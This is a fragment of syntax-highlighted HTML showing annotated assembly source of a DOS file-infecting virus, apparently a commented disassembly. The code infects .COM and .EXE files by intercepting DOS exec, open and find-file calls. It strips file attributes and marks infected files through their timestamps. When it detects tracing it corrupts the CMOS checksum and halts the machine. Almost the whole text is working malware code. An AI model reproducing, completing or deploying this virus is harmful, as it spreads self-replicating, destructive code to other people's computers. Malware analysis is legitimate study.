        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">':)'</span><span class="sc0">         </span><span class="sc1">; Being traced?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_tracing</span><span class="sc0">      </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; CMOS: Select address 2Eh (checksum)</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; CMOS: Write 2Eh (corrupt checksum)</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">hlt</span><span class="sc0">                     </span><span class="sc1">; Halt computer</span><span class="sc0">

</span><span class="sc5">no_tracing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">198h</span><span class="sc4">],</span><span class="sc2">0DEADh</span><span class="sc0">        </span><span class="sc1">; Residency mark</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">infection_count</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">88h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; ??</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">        </span><span class="sc1">; Exec?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">try_to_infect</span><span class="sc0">   </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">          </span><span class="sc1">; Open?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">try_to_infect</span><span class="sc0">   </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">          </span><span class="sc1">; Find-first (handle)?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmp_fn</span><span class="sc0">          </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ff_fn</span><span class="sc0">

</span><span class="sc5">cmp_fn</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">          </span><span class="sc1">; Find-Next (handle)?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_fffn</span><span class="sc0">        </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">popregs_iret</span><span class="sc0">

</span><span class="sc5">jmp_fffn</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ff_fn</span><span class="sc0">

</span><span class="sc5">try_to_infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">convert2uppercase</span><span class="sc0">       </span><span class="sc1">; Convert filename to uppercase</span><span class="sc0">
</span><span class="sc5">search_extension</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; End of string?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_dot</span><span class="sc0">      </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">popregs_iret</span><span class="sc0">    </span><span class="sc1">; Yes? then jmp (no dot)</span><span class="sc0">

</span><span class="sc5">search_dot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">          </span><span class="sc1">; Dot?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_dot</span><span class="sc0">       </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Next char</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">search_extension</span><span class="sc0">

</span><span class="sc5">found_dot</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">      </span><span class="sc1">; *.CO*?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_if_exe</span><span class="sc0">            </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">     </span><span class="sc1">; *.COM?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_jmp_infect</span><span class="sc0">          </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">popregs_iret</span><span class="sc0">

</span><span class="sc5">jmp_jmp_infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jmp_infect</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">check_if_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">      </span><span class="sc1">; *.EX*?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">maybe_exe</span><span class="sc0">               </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">popregs_iret</span><span class="sc0">

</span><span class="sc5">maybe_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">     </span><span class="sc1">; *.EXE?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">jmp_infect</span><span class="sc0">              </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">popregs_iret</span><span class="sc0">

</span><span class="sc5">jmp_infect</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Gimme the prize, just gimme the prize'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Get int 24h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ofs_i24</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; Save it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg_i24</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_24</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Set new int 24h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Get file attributes</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">reset_attr</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_i24</span><span class="sc0">

</span><span class="sc5">reset_attr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">attributes</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Reset attributes</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">check_name</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_i24</span><span class="sc0">

</span><span class="sc5">check_name</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_valid_fname</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get int 2Ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i2a</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i2a</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int_2a</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">  </span><span class="sc1">; Set new int 2Ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">l_search_ext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">       </span><span class="sc1">; Dot?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_ext</span><span class="sc0">               </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_search_ext</span><span class="sc0">

</span><span class="sc5">found_ext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Get first char of extension</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">byte_ext</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Save it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_byte_ext</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; and save its address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_byte_ext</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                                                </span><span class="sc1">; BUG!!! Missing 'mov [di+1],xx'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">                  </span><span class="sc1">; Open file I/O</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">open_ok</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_i2a</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_attr</span><span class="sc0">

</span><span class="sc5">open_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_i2a</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">read_header</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">int_2a</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; Int 2Ah: Called by int 21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">82h</span><span class="sc0">          </span><span class="sc1">; End DOS critical sections 0-7 ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit_i2a</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_byte_ext</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc1">; Restore file extension</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_byte_ext</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">byte_ext</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">exit_i2a</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">    

</span><span class="sc5">ofs_byte_ext</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_byte_ext</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">byte_ext</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ofs_i2a</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_i2a</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">restore_i2a</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i2a</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">      </span><span class="sc1">; Restore int 2Ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i2a</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ah</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">read_header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; DS:=CS-10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">e_header_exe</span><span class="sc4">-</span><span class="sc5">header_exe</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">header</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Read file header</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">get_timedate</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">get_timedate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_21</span><span class="sc0">          </span><span class="sc1">; Get file time/date</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">timedate_ok</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">timedate_ok</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; File date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">; Get month</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; File time</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">          </span><span class="sc1">; Get seconds</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; Infected? (seconds==month)</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_header</span><span class="sc0">    </span><span class="sc1">; No? then jmp</span><span class="sc0">
